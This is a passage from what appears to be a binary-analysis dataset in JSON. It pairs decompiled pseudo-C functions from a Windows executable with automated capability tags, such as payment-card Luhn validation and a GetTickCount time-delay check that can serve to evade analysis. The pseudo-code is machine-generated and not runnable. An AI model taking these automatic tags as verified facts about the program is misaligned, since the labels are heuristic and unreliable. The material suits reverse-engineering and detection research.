in_stack_fffff8f4, in_stack_fffff8f8, in_stack_fffff8fc, in_stack_fffff900);\n    fcn.0042ad2a(noname_2);\n    return;\n}\n",
        "token_count": 1332
    },
    "0040d920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.0040d920(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    int32_t noname_3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint var_4h;\n    \n    noname_3 = fcn.0042d83d(arg_8h, 0x446fd4, &var_4h);\n    while (noname_3 != 0) {\n        fcn.0040d220(arg_10h, 0x4453cc, arg_ch, noname_3, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch\n                     , 0, unaff_EDI, unaff_ESI, unaff_EBX, var_4h, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, \n                     arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch, in_stack_0000002c, in_stack_00000030\n                     , in_stack_00000034, in_stack_00000038, in_stack_0000003c, in_stack_00000040, in_stack_00000044, \n                     in_stack_00000048);\n        noname_3 = fcn.0042d83d(0, 0x446fd4, &var_4h);\n    }\n    return;\n}\n",
        "token_count": 504
    },
    "0040de00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0040de00(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    uint32_t auStackY100076 [4];\n    uint uStackY100060;\n    uint32_t uStackY100056;\n    uchar auStackY100048 [20];\n    uint32_t uStackY100028;\n    uchar auStackY100020 [99328];\n    uchar *arg_8h_00;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43debe;\n    var_ch = *in_FS_OFFSET;\n    fcn.0042ae40();\n    *in_FS_OFFSET = &var_ch;\n    fcn.0042acb0();\n    (**0x469258)();\n    fcn.0040be30(auStackY100048);\n    var_4h = 0;\n    (**0x469258)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100028) {\n        fcn.0042ac49();\n    }\n    (**0x469258)();\n    (**0x469258)();\n    fcn.0041f1d0();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    fcn.0041ff90(auStackY100048);\n    var_4h = 1;\n    (**0x469258)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100028) {\n        fcn.0042ac49();\n    }\n    (**0x469258)();\n    (**0x469258)();\n    fcn.0041ff10(auStackY100048);\n    var_4h = 2;\n    (**0x469258)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100028) {\n        fcn.0042ac49();\n    }\n    (**0x469258)();\n    (**0x469258)();\n    fcn.004202b0(auStackY100048);\n    var_4h = 3;\n    (**0x469258)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100028) {\n        fcn.0042ac49();\n    }\n    (**0x469258)();\n    (**0x469258)();\n    uVar1 = (**0x4691cc)();\n    fcn.00423f20(auStackY100048, uVar1);\n    var_4h = 4;\n    (**0x469258)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100028) {\n        fcn.0042ac49();\n    }\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    fcn.0041f6a0();\n    (**0x469258)();\n    (**0x469258)();\n    fcn.0041f760();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    fcn.0041fb40();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    fcn.00420090();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    fcn.0041f640();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    fcn.0041f7a0();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    fcn.004207d0(auStackY100048);\n    var_4h = 5;\n    (**0x469258)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100028) {\n        fcn.0042ac49();\n    }\n    (**0x469258)();\n    (**0x469258)();\n    fcn.00420940(auStackY100048);\n    var_4h = 6;\n    (**0x469258)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100028) {\n        fcn.0042ac49();\n    }\n    (**0x469258)();\n    (**0x469258)();\n    fcn.0041f840();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    fcn.0041f1d0();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    fcn.00420af0(auStackY100048);\n    var_4h = 7;\n    (**0x469258)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100028) {\n        fcn.0042ac49();\n    }\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    fcn.0041f300();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    uVar1 = fcn.0041f240();\n    fcn.004245b0(auStackY100048, uVar1);\n    var_4h = 8;\n    (**0x469258)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100028) {\n        fcn.0042ac49();\n    }\n    (**0x469258)();\n    (**0x469258)();\n    fcn.0041fe50(auStackY100076);\n    var_4h = 9;\n    (**0x469258)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100056) {\n        fcn.0042ac49();\n    }\n    uStackY100056 = 0xf;\n    uStackY100060 = 0;\n    auStackY100076[0] = auStackY100076[0] & 0xffffff00;\n    (**0x469258)();\n    (**0x469258)();\n    fcn.0041f5b0();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    fcn.0041f7f0();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    fcn.0041fa10(auStackY100020);\n    (**0x469258)();\n    arg_8h_00 = auStackY100020;\n    (**0x469258)();\n    (**0x469258)();\n    fcn.0041f3c0(auStackY100020);\n    uVar1 = (**0x469150)();\n    fcn.00429fe0(arg_8h, *0x4580a4, auStackY100020, uVar1);\n    fcn.0042acb0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1627
    },
    "0040e6b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040e6b0(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.0042b420(arg_10h);\n    uVar1 = fcn.0040baf0(arg_10h, uVar1);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    fcn.004063b0(uVar1);\n    return arg_8h;\n}\n",
        "token_count": 149
    },
    "0040e700": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040e700(uint *arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uint *puVar5;\n    uint arg_ch_00;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43df09;\n    var_ch = *in_FS_OFFSET;\n    uVar3 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h[5] = 0xf;\n    arg_8h[4] = 0;\n    *arg_8h = 0;\n    var_4h = 0;\n    iVar1 = *(arg_ch + 0x10);\n    iVar4 = fcn.0042b420(arg_10h, uVar3);\n    arg_8h_00 = iVar4 + iVar1;\n    uVar3 = arg_8h[4];\n    if (((uVar3 <= arg_8h_00) && (arg_8h[5] != arg_8h_00)) && (cVar2 = fcn.00405d10(arg_8h_00, 1),  cVar2 != '\\0')) {\n        arg_8h[4] = uVar3;\n        puVar5 = arg_8h;\n        if (0xf < arg_8h[5]) {\n            puVar5 = *arg_8h;\n        }\n        *(puVar5 + uVar3) = 0;\n    }\n    fcn.00405dc0(arg_ch, 0, 0xffffffff);\n    arg_ch_00 = fcn.0042b420(arg_10h);\n    fcn.0040baf0(arg_10h, arg_ch_00);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 474
    },
    "0040ff10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040ff10(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, uint noname_37, \n            uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, uint noname_43, \n            uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, uint noname_49, \n            uint noname_50, uint noname_51, uint noname_52, uint noname_53, uint noname_54, uint noname_55, \n            uint noname_56, uint noname_57, uint noname_58, uint noname_59, uint noname_60, uint noname_61, \n            uint noname_62, uint noname_63, uint noname_64, uint noname_65, uint noname_66, uint arg_8h, uint noname_68\n            , uint noname_69, uint noname_70, uint noname_71, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h;\n    uint var_18h_3;\n    uint32_t var_1ch_3;\n    uint32_t var_24h;\n    uint var_34h_2;\n    uint32_t var_38h_2;\n    uint var_40h_2;\n    uint32_t var_54h_2;\n    uint var_a4h;\n    uint var_9dh;\n    uint var_80h;\n    uint var_6ch;\n    uint var_64h;\n    uint var_54h;\n    uint var_50h;\n    uint var_48h;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint *arg_8h_00;\n    uint32_t in_stack_fffffef0;\n    uint in_stack_fffffef4;\n    uint in_stack_fffffef8;\n    uint in_stack_fffffefc;\n    uint arg_28h;\n    uint arg_2ch;\n    uint in_stack_ffffff08;\n    uint noname_11_00;\n    uint noname_13_00;\n    uint arg_40h;\n    uint var_a4h_2;\n    uint var_9ch;\n    uint32_t var_88h;\n    uint32_t var_80h_3;\n    uint var_a8h;\n    uint uStack116;\n    uint32_t var_6ch_3;\n    uint32_t var_64h_2;\n    uint var_80h_2;\n    uint32_t var_50h_2;\n    uint32_t var_48h_2;\n    uint var_70h;\n    uint var_6ch_2;\n    uint var_38h;\n    uint32_t var_34h;\n    uint *var_2ch_2;\n    uint var_1ch_2;\n    uint32_t var_18h_2;\n    uint32_t var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_2;\n    \n    uStack12 = 0x43e28e;\n    var_ch_2 = *in_FS_OFFSET;\n    var_10h_2 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch_2;\n    var_18h_2 = 0xf;\n    var_1ch_2 = 0;\n    var_2ch_2 = var_2ch_2 & 0xffffff00;\n    var_4h_2._0_1_ = 3;\n    var_4h_2._1_3_ = 0;\n    puVar4 = var_8h;\n    if (var_1ch_3 < 0x10) {\n        puVar4 = &var_8h;\n    }\n    fcn.00414ac0(puVar4);\n    (**0x469288)();\n    uVar1 = fcn.0040be70(&var_80h_3);\n    var_4h_2._0_1_ = 4;\n    uVar2 = fcn.0040e700(&var_64h_2, &var_8h, 0x446fe4);\n    var_4h_2 = CONCAT31(var_4h_2._1_3_, 5);\n    fcn.004064b0(&var_48h_2, uVar2, uVar1);\n    if (0xf < var_50h_2) {\n        fcn.0042ac49();\n    }\n    var_50h_2 = 0xf;\n    var_80h_2 = 0;\n    var_64h_2 = var_64h_2 & 0xffffff00;\n    var_4h_2._0_1_ = 8;\n    if (0xf < var_6ch_3) {\n        fcn.0042ac49();\n    }\n    arg_40h = 0xffffffff;\n    noname_13_00 = 0;\n    puVar4 = &var_40h_2;\n    var_6ch_3 = 0xf;\n    uStack116 = 0;\n    var_80h_3 = var_80h_3 & 0xffffff00;\n    fcn.00406180(puVar4, 0, 0xffffffff);\n    noname_11_00 = 0;\n    uVar2 = 0xffffffff;\n    uVar1 = 0;\n    arg_8h_00 = &var_48h_2;\n    arg_2ch = 0xf;\n    arg_28h = 0;\n    var_4h_2._0_1_ = 9;\n    in_stack_fffffef0 = in_stack_fffffef0 & 0xffffff00;\n    fcn.00406180(arg_8h_00, 0, 0xffffffff);\n    var_4h_2._0_1_ = 8;\n    uVar1 = fcn.0040ef60(&var_9ch, arg_8h_00, uVar1, uVar2, in_stack_fffffef0, in_stack_fffffef4, in_stack_fffffef8, \n                         in_stack_fffffefc, arg_28h, arg_2ch, in_stack_ffffff08, noname_11_00, puVar4, noname_13_00, \n                         arg_40h);\n    var_4h_2._0_1_ = 10;\n    fcn.004063b0(uVar1);\n    var_4h_2 = CONCAT31(var_4h_2._1_3_, 8);\n    if (0xf < var_88h) {\n        fcn.0042ac49();\n    }\n    iVar3 = (**0x469288)();\n    if (iVar3 == 0) {\n        uVar2 = fcn.0042b420();\n        fcn.00406270(0x447138, uVar2);\n    }\n    else {\n        fcn.00406180(&var_8h, 0, 0xffffffff);\n        puVar4 = var_2ch_2;\n        if (var_18h_2 < 0x10) {\n            puVar4 = &var_2ch_2;\n        }\n        fcn.0040b090(puVar4);\n    }\n    var_1ch_2 = 0;\n    puVar4 = var_2ch_2;\n    if (var_18h_2 < 0x10) {\n        puVar4 = &var_2ch_2;\n    }\n    *puVar4 = 0;\n    if (0xf < var_34h) {\n        fcn.0042ac49();\n    }\n    var_34h = 0xf;\n    var_38h = 0;\n    var_48h_2 = var_48h_2 & 0xffffff00;\n    if (0xf < var_18h_2) {\n        fcn.0042ac49();\n    }\n    var_18h_2 = 0xf;\n    var_1ch_2 = 0;\n    var_2ch_2 = var_2ch_2 & 0xffffff00;\n    if (0xf < var_1ch_3) {\n        fcn.0042ac49();\n    }\n    var_1ch_3 = 0xf;\n    var_18h_3 = 0;\n    var_8h = var_8h & 0xffffff00;\n    if (0xf < var_38h_2) {\n        fcn.0042ac49();\n    }\n    var_38h_2 = 0xf;\n    var_34h_2 = 0;\n    var_24h = var_24h & 0xffffff00;\n    if (0xf < var_54h_2) {\n        fcn.0042ac49();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042ad2a(uVar1);\n    return;\n}\n",
        "token_count": 2316
    },
    "00410180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410180(void)\n\n{\n    uint arg_ch;\n    uint *puVar1;\n    uint uVar2;\n    uint unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uint var_178h;\n    uint var_174h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint var_38h;\n    uint32_t var_34h;\n    uint var_2ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e2f8;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar2 = *0x458374;\n    var_34h = 0xf;\n    var_38h = 0;\n    var_48h = var_48h & 0xffffff00;\n    arg_ch = fcn.0042b420(*0x458374, var_10h);\n    fcn.00406270(uVar2, arg_ch);\n    var_4h = 0;\n    if (*0x4586f8 == 0) {\n        puVar1 = fcn.0040e700(&var_2ch, &var_48h, 0x4471a4);\n        var_4h._0_1_ = 1;\n        if (0xf < puVar1[5]) {\n            puVar1 = *puVar1;\n        }\n        var_178h = 0;\n        fcn.00408bf0(*0x45868c, 0x4471a4, 1, &var_178h, &var_174h);\n        uVar2 = (**0x4692b4)(0, var_4ch);\n        (**0x46923c)(uVar2);\n        fcn.0040ac70(*0x45868c, var_178h, puVar1);\n        var_4h._0_1_ = 0;\n        if (0xf < var_18h) {\n            fcn.0042ac49(var_2ch);\n        }\n        puVar1 = fcn.0040e700(&var_2ch, &var_48h, 0x447194);\n        var_4h._0_1_ = 2;\n        if (0xf < puVar1[5]) {\n            puVar1 = *puVar1;\n        }\n        var_178h = 0;\n        fcn.00408bf0(*0x45868c, 0x447194, 1, &var_178h, &var_174h);\n        uVar2 = (**0x4692b4)(0, var_4ch);\n        (**0x46923c)(uVar2);\n        fcn.0040ac70(*0x45868c, var_178h, puVar1);\n        var_4h._0_1_ = 0;\n        if (0xf < var_18h) {\n            fcn.0042ac49(var_2ch);\n        }\n        puVar1 = fcn.0040e700(&var_2ch, &var_48h, 0x447188);\n        var_4h._0_1_ = 3;\n        if (0xf < puVar1[5]) {\n            puVar1 = *puVar1;\n        }\n        var_178h = 0;\n        fcn.00408bf0(*0x45868c, 0x447188, 1, &var_178h, &var_174h);\n        uVar2 = (**0x4692b4)(0, var_4ch);\n        (**0x46923c)(uVar2);\n        fcn.0040ac70(*0x45868c, var_178h, puVar1);\n        var_4h._0_1_ = 0;\n        if (0xf < var_18h) {\n            fcn.0042ac49(var_2ch);\n        }\n        puVar1 = fcn.0040e700(&var_2ch, &var_48h, 0x447178);\n        var_4h._0_1_ = 4;\n        if (0xf < puVar1[5]) {\n            puVar1 = *puVar1;\n        }\n        var_178h = 0;\n        fcn.00408bf0(*0x45868c, 0x447178, 1, &var_178h, &var_174h);\n        uVar2 = (**0x4692b4)(0, var_4ch);\n        (**0x46923c)(uVar2);\n        fcn.0040ac70(*0x45868c, var_178h, puVar1);\n        var_4h._0_1_ = 0;\n        if (0xf < var_18h) {\n            fcn.0042ac49(var_2ch);\n        }\n        puVar1 = fcn.0040e700(&var_2ch, &var_48h, 0x44716c);\n        var_4h._0_1_ = 5;\n        if (0xf < puVar1[5]) {\n            puVar1 = *puVar1;\n        }\n        var_178h = 0;\n        fcn.00408bf0(*0x45868c, 0x44716c, 1, &var_178h, &var_174h);\n        uVar2 = (**0x4692b4)(0, var_4ch);\n        (**0x46923c)(uVar2);\n        fcn.0040ac70(*0x45868c, var_178h, puVar1);\n        var_4h._0_1_ = 0;\n        if (0xf < var_18h) {\n            fcn.0042ac49(var_2ch);\n        }\n        puVar1 = fcn.0040e700(&var_2ch, &var_48h, 0x447160);\n        var_4h = CONCAT31(var_4h._1_3_, 6);\n        if (0xf < puVar1[5]) {\n            puVar1 = *puVar1;\n        }\n        var_178h = 0;\n        fcn.00408bf0(*0x45868c, 0x447160, 1, &var_178h, &var_174h);\n        uVar2 = (**0x4692b4)(0, var_4ch);\n        (**0x46923c)(uVar2);\n        fcn.0040ac70(*0x45868c, var_178h, puVar1);\n        if (0xf < var_18h) {\n            fcn.0042ac49(var_2ch);\n        }\n        *0x4586f8 = 1;\n    }\n    if (0xf < var_34h) {\n        fcn.0042ac49(var_48h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(unaff_ESI);\n    return;\n}\n",
        "token_count": 1645
    },
    "00410560": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_154h_4\n// WARNING: Variable defined which should be unmapped: var_14dh_5\n// WARNING: Variable defined which should be unmapped: var_15ch_2\n// WARNING: Variable defined which should be unmapped: var_130h_3\n// WARNING: Variable defined which should be unmapped: var_158h_2\n// WARNING: Variable defined which should be unmapped: var_14dh_3\n// WARNING: Variable defined which should be unmapped: var_130h_4\n// WARNING: Variable defined which should be unmapped: var_154h_3\n// WARNING: Variable defined which should be unmapped: var_158h\n// WARNING: Variable defined which should be unmapped: var_138h\n// WARNING: Variable defined which should be unmapped: var_14dh_2\n// WARNING: Variable defined which should be unmapped: var_114h_3\n// WARNING: Variable defined which should be unmapped: var_11ch_2\n// WARNING: Variable defined which should be unmapped: var_154h\n// WARNING: Variable defined which should be unmapped: var_14dh\n// WARNING: Variable defined which should be unmapped: var_114h_5\n// WARNING: Variable defined which should be unmapped: var_114h_2\n// WARNING: Variable defined which should be unmapped: var_11ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410560(void)\n\n{\n    uint32_t noname_21;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint var_4h_3;\n    uint var_4h_2;\n    uint var_4h_5;\n    uint var_10h_2;\n    uint var_ch_2;\n    uint var_4h;\n    uint var_15ch;\n    uint var_114h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t in_stack_fffffdf8;\n    uint in_stack_fffffdfc;\n    uint in_stack_fffffe00;\n    uint in_stack_fffffe04;\n    uint uVar3;\n    uint uVar4;\n    uint noname_8;\n    uint uVar5;\n    uint noname_9;\n    uchar *in_stack_fffffe14;\n    uint in_stack_fffffe18;\n    uint32_t in_stack_fffffe1c;\n    int32_t in_stack_fffffe20;\n    uint uVar6;\n    uint *arg_8h;\n    uint uVar7;\n    uchar *puVar8;\n    uint in_stack_fffffe2c;\n    uchar *in_stack_fffffe30;\n    uint in_stack_fffffe34;\n    uint32_t noname_12;\n    uchar *puVar9;\n    uint *arg_8h_00;\n    uchar *in_stack_fffffe48;\n    uint uVar10;\n    uint in_stack_fffffe4c;\n    uint in_stack_fffffe50;\n    uchar *in_stack_fffffe54;\n    uint in_stack_fffffe58;\n    uint in_stack_fffffe5c;\n    uint noname_9_00;\n    uchar *noname_10;\n    uint in_stack_fffffe68;\n    uint in_stack_fffffe6c;\n    uint in_stack_fffffe70;\n    uint uVar11;\n    uint in_stack_fffffe74;\n    uint in_stack_fffffe78;\n    uint in_stack_fffffe7c;\n    uint uVar12;\n    uint noname_18;\n    uchar *noname_19;\n    uint var_154h_4;\n    uint var_14dh_5;\n    uchar *puVar13;\n    uchar *in_stack_fffffea4;\n    uint var_15ch_2;\n    uint in_stack_fffffeac;\n    uint var_130h_3;\n    uint in_stack_fffffeb4;\n    uint in_stack_fffffeb8;\n    uint var_158h_2;\n    uint in_stack_fffffec0;\n    uchar auStack316 [3];\n    uint var_14dh_3;\n    uint var_130h_4;\n    uint var_154h_3;\n    uint in_stack_fffffed4;\n    uint var_158h;\n    uint var_138h;\n    uchar var_154h_2 [3];\n    uint var_14dh_2;\n    uint in_stack_fffffee8;\n    uint in_stack_fffffeec;\n    uint var_114h_3;\n    uint in_stack_fffffef4;\n    uint var_11ch_2;\n    uint var_154h;\n    uchar var_130h [3];\n    uint var_14dh;\n    uint in_stack_ffffff08;\n    uint var_114h_5;\n    uint var_114h_2;\n    uint var_11ch;\n    uint in_stack_ffffff18;\n    uint in_stack_ffffff1c;\n    uint in_stack_ffffff20;\n    uint in_stack_ffffff24;\n    uint in_stack_ffffff28;\n    uint var_114h_4;\n    uint var_4h_4;\n    int32_t iStack16;\n    uint uStack12;\n    uint var_4h_6;\n    \n    var_4h_6 = 0xffffffff;\n    uStack12 = 0x43e43e;\n    iStack16 = *in_FS_OFFSET;\n    noname_21 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    uVar12 = 0x4105a1;\n    fcn.0042acb0();\n    noname_19 = &stack0xfffffee8;\n    (**0x469258)();\n    do {\n        noname_18 = 0x4471b8;\n        puVar9 = &stack0xfffffe68;\n        noname_10 = &stack0xfffffe68;\n        noname_9_00 = 0x4105dc;\n        fcn.0040beb0(&stack0xfffffe68);\n        puVar8 = &stack0xfffffe48;\n        var_4h_6 = 2;\n        fcn.0040bef0(&stack0xfffffe48);\n        arg_8h_00 = &fcn.00410560::var_130h_4;\n        var_4h_6._0_1_ = 3;\n        iVar1 = fcn.0040bef0(arg_8h_00);\n        iVar1 = *(iVar1 + 0x10) + 1;\n        var_4h_6 = CONCAT31(var_4h_6._1_3_, 5);\n        noname_12 = 0x410622;\n        fcn.0040fd20(iVar1, arg_8h_00, puVar8, in_stack_fffffe48, in_stack_fffffe4c, in_stack_fffffe50, \n                     in_stack_fffffe54, in_stack_fffffe58, in_stack_fffffe5c, noname_9_00, noname_10, in_stack_fffffe68\n                     , in_stack_fffffe6c, in_stack_fffffe70, in_stack_fffffe74, in_stack_fffffe78, in_stack_fffffe7c, \n                     uVar12, noname_18, noname_19, 0x446fe4, noname_21, unaff_EDI, unaff_ESI, unaff_EBX, puVar9, \n                     in_stack_fffffea4, &stack0xfffffe48, in_stack_fffffeac, var_130h_3, in_stack_fffffeb4, \n                     in_stack_fffffeb8, var_158h_2, in_stack_fffffec0, _auStack316, stack0xfffffec8, var_130h_4, \n                     var_154h_3, in_stack_fffffed4, var_158h, var_138h, _var_154h_2, stack0xfffffee4, in_stack_fffffee8\n                     , in_stack_fffffeec, var_114h_3, in_stack_fffffef4, var_11ch_2, var_154h, _var_130h, \n                     stack0xffffff04, in_stack_ffffff08, var_114h_5, var_114h_2, var_11ch, in_stack_ffffff18, \n                     in_stack_ffffff1c, in_stack_ffffff20, in_stack_ffffff24);\n        var_4h_6 = 0xffffffff;\n        if (0xf < _var_154h_2) {\n            fcn.0042ac49();\n        }\n        in_stack_fffffe74 = *0x456244;\n        if (*0x456258 < 0x10) {\n            in_stack_fffffe74 = 0x456244;\n        }\n        in_stack_fffffe78 = 0x447138;\n        uVar11 = 0x41065d;\n        iVar2 = (**0x469288)();\n        if (iVar2 != 0) {\n            in_stack_fffffe54 = &stack0xfffffe58;\n            in_stack_fffffe50 = 0x41067c;\n            fcn.0040bfb0(&stack0xfffffe58);\n            puVar9 = &stack0xfffffe38;\n            in_stack_fffffe4c = 0xf;\n            uVar10 = 0;\n            var_4h_6 = 6;\n            noname_12 = noname_12 & 0xffffff00;\n            in_stack_fffffe34 = fcn.0042b420();\n            in_stack_fffffe30 = &stack0xfffffee8;\n            in_stack_fffffe2c = 0x4106bd;\n            fcn.00406270(in_stack_fffffe30, in_stack_fffffe34);\n            puVar13 = &stack0xfffffe14;\n            uVar5 = 0xffffffff;\n            uVar4 = 0;\n            uVar7 = 0xf;\n            uVar6 = 0;\n            uVar3 = 0x456244;\n            var_4h_6 = CONCAT31(var_4h_6._1_3_, 7);\n            in_stack_fffffe14 = in_stack_fffffe14 & 0xffffff00;\n            fcn.00406180(0x456244, 0, 0xffffffff);\n            var_4h_6 = 0xffffffff;\n            in_stack_fffffe04 = 0x4106f2;\n            fcn.0040ff10(uVar3, uVar4, uVar5, in_stack_fffffe14, in_stack_fffffe18, in_stack_fffffe1c, in_stack_fffffe20\n                         , uVar6, uVar7, in_stack_fffffe2c, in_stack_fffffe30, in_stack_fffffe34, noname_12, iVar1, \n                         arg_8h_00, puVar8, uVar10, in_stack_fffffe4c, in_stack_fffffe50, in_stack_fffffe54, \n                         in_stack_fffffe58, in_stack_fffffe5c, noname_9_00, noname_10, in_stack_fffffe68, \n                         in_stack_fffffe6c, uVar11, in_stack_fffffe74, in_stack_fffffe78, in_stack_fffffe7c, uVar12, \n                         noname_18, noname_19, 0x446fe4, noname_21, unaff_EDI, unaff_ESI, unaff_EBX, puVar9, puVar13, \n                         &stack0xfffffe58, in_stack_fffffeac, var_130h_3, in_stack_fffffeb4, in_stack_fffffeb8, \n                         var_158h_2, in_stack_fffffec0, _auStack316, stack0xfffffec8, var_130h_4, var_154h_3, \n                         in_stack_fffffed4, var_158h, var_138h, _var_154h_2, stack0xfffffee4, in_stack_fffffee8, \n                         in_stack_fffffeec, var_114h_3, in_stack_fffffef4, var_11ch_2, var_154h, _var_130h, \n                         stack0xffffff04, in_stack_ffffff08, var_114h_5, var_114h_2, var_11ch, in_stack_ffffff18, \n                         in_stack_ffffff1c, in_stack_ffffff20, in_stack_ffffff24, in_stack_ffffff28);\n        }\n        in_stack_fffffe6c = *0x456244;\n        if (*0x456258 < 0x10) {\n            in_stack_fffffe6c = 0x456244;\n        }\n        in_stack_fffffe70 = 0x447138;\n        iVar2 = (**0x469288)();\n        if (iVar2 != 0) {\n            uVar12 = fcn.0040bf70(&fcn.00410560::var_130h_4);\n            var_4h_6 = 0x10;\n            fcn.004063b0(uVar12);\n            var_4h_6 = 0xffffffff;\n            if (0xf < _var_154h_2) {\n                fcn.0042ac49();\n            }\n            uVar12 = fcn.0040bfb0(&fcn.00410560::var_130h_4);\n            var_4h_6 = 0x11;\ncode_r0x00410cc6:\n            fcn.004063b0(uVar12);\njoined_r0x00410c6e:\n            if (_var_154h_2 < 0x10) goto code_r0x00410ce8;\n            goto code_r0x00410ce0;\n        }\n        uVar3 = 0x4471b8;\n        in_stack_fffffea4 